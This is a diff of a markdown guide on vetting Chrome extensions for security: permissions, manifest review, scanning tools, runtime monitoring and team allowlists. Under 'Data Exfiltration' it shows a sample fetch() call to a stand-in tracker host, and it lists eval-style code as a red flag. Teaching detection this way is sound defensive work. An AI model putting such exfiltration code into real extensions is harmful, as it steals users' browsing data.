@@ -13,14 +13,13 @@ categories: [guides]
 tags: [claude-code, claude-skills]
 ---
 
-
 Chrome extensions enhance browser functionality but can also access sensitive data. Before installing any extension, you should verify its safety. This guide covers practical methods for developers and power users to assess extension security.
 
-Why Chrome Extension Security Matters
+## Why Chrome Extension Security Matters
 
 Chrome extensions run with broad permissions. They can read page content, modify DOM elements, capture keystrokes, and access cookies. A malicious extension can steal passwords, inject ads, or track browsing activity. The Chrome Web Store provides some screening, but threats still slip through. You need to evaluate extensions yourself.
 
-Check Extension Permissions
+## Check Extension Permissions
 
 Every extension lists required permissions in the Chrome Web Store. Visit the extension page and scroll to the "Permissions" section. Look for concerning access levels:
 
@@ -31,7 +30,7 @@ Every extension lists required permissions in the Chrome Web Store. Visit the ex
 
 Extensions requesting permissions beyond their stated purpose raise red flags. A simple calculator app should not need access to all websites.
 
-Analyze the Extension Manifest
+## Analyze the Extension Manifest
 
 The manifest.json file defines what an extension can do. You can inspect it before installing using the CRX Extractor's web interface or by downloading the extension package.
 
@@ -62,15 +61,15 @@ Review the permissions array and host permissions:
 
 Compare requested permissions with the extension's functionality. Excessive permissions indicate potential issues.
 
-Use Static Analysis Tools
+## Use Static Analysis Tools
 
 Several tools help analyze extension security:
 
-Chrome Extension Source Viewer
+## Chrome Extension Source Viewer
 
 This browser extension displays source code directly in the Web Store. Install it, visit any extension page, and click "View Source" to examine the code without downloading.
 
-CRXCavator
+## CRXCavator
 
 Visit [crxcavator.io](https://crxcavator.io) and paste an extension URL. The tool analyzes permissions, reviews code complexity, and provides a risk score based on suspicious patterns.
 
@@ -90,11 +89,11 @@ The scanner checks for:
 - Inline script execution
 - Deprecated APIs
 
-Examine Code for Red Flags
+## Examine Code for Red Flags
 
 When reviewing extension source, watch for these warning signs:
 
-Data Exfiltration
+## Data Exfiltration
 
 ```javascript
 // Suspicious: sending data to unknown domains
@@ -104,7 +103,7 @@ fetch('https://analytics-tracker.example.com/collect', {
 });
 ```
 
-Persistent Scripts
+## Persistent Scripts
 
 ```javascript
 // Content scripts that run on every page
@@ -124,7 +123,7 @@ new Function(code)();
 
 Legitimate extensions rarely need these patterns.
 
-Check Developer Reputation
+## Check Developer Reputation
 
 Research the extension developer before installing:
 
@@ -135,19 +134,19 @@ Research the extension developer before installing:
 
 Extensions with no developer information or abandoned update histories pose higher risks.
 
-Use Extension Firewall
+## Use Extension Firewall
 
 For advanced protection, use extension management tools:
 
-Extension Permissions Manager
+## Extension Permissions Manager
 
 Chrome's built-in manager shows all installed extensions. Visit `chrome://extensions` and enable "Developer mode" to see details. Review permissions regularly and remove unused extensions.
 
-Firefox uBlock Origin Approach
+## Firefox uBlock Origin Approach
 
 While not Chrome-specific, the principle applies: grant minimum necessary permissions. Some developers use separate browser profiles for extension testing.
 
-Practical Workflow
+## Practical Workflow
 
 Before installing any extension, follow this verification sequence:
 
@@ -165,7 +164,7 @@ google-chrome --profile-directory="TestProfile"
 
 Install the extension there first. Monitor network activity using Chrome DevTools to detect unexpected data transmission.
 
-Monitoring Extensions After Installation
+## Monitoring Extensions After Installation
 
 Most guides focus on pre-install checks, but ongoing monitoring is just as important. Extensions update silently in the background, and a legitimate extension acquired by a new owner can introduce malicious behavior in a subsequent update. This is a real attack vector. threat actors have purchased well-reviewed extensions specifically to push malicious updates to an established user base.
 
@@ -181,7 +180,7 @@ curl -s "https://clients2.google.com/service/update2/crx?response=manifest&x=id%
 
 Compare the result against what is installed. If the extension updated unexpectedly and the new version requests additional permissions, Chrome will prompt you to re-approve. never ignore those prompts or dismiss them without reading the new permission list.
 
-Network Traffic Analysis
+## Network Traffic Analysis
 
 Reviewing source code catches static patterns, but dynamic analysis tells you what an extension actually does at runtime. Chrome DevTools provides everything you need to monitor extension network activity without additional software.
 
@@ -199,7 +198,7 @@ Look for requests originating during extension actions
 
 Pay particular attention to POST requests that fire immediately after you complete a form or enter a password. Legitimate extensions with no stated data-collection purpose have no reason to make these calls.
 
-Sandboxing Extensions with Browser Profiles
+## Sandboxing Extensions with Browser Profiles
 
 Testing an extension in a separate Chrome profile is mentioned in many security guides, but few explain how to make this a sustainable part of a developer workflow rather than a one-off step.
 
@@ -219,7 +218,7 @@ Within the testing profile, install only the extension under evaluation. Open De
 
 For extensions that require access to specific sites (like a GitHub productivity tool that only needs access to github.com), use the Chrome permission controls to restrict the extension even further. Right-click the extension icon and select "This can read and change site data" to limit access to "When you click the extension" rather than granting automatic access on every page load.
 
-Building an Internal Allowlist
+## Building an Internal Allowlist
 
 Teams managing multiple developer machines benefit from maintaining a shared allowlist of reviewed and approved extensions. Rather than each developer independently evaluating the same tools, a single review can be documented and the result shared across the team.
 
@@ -248,14 +247,13 @@ A simple allowlist can be maintained as a JSON file in a shared repository:
 
 This approach creates an audit trail and ensures that approval decisions are documented with reasoning rather than being implicit. When an extension updates and requests new permissions, it triggers a re-review rather than silent approval.
 
-Conclusion
+## Conclusion
 
 Verifying Chrome extension safety requires multiple layers of inspection. No single method guarantees safety, but combining permission analysis, source code review, automated tools, and ongoing monitoring significantly reduces risk. Always question why an extension needs certain permissions, and prefer open-source extensions with active communities.
 
 For developers building extensions, minimize permissions requested. Only ask for access your functionality absolutely requires. Users will increasingly scrutinize extensions, and transparent, minimal permission requests build trust.
 
 Stay vigilant. Your browser extension security depends on proactive evaluation before installation, and continued attention after.
-
 
 Related Reading
 
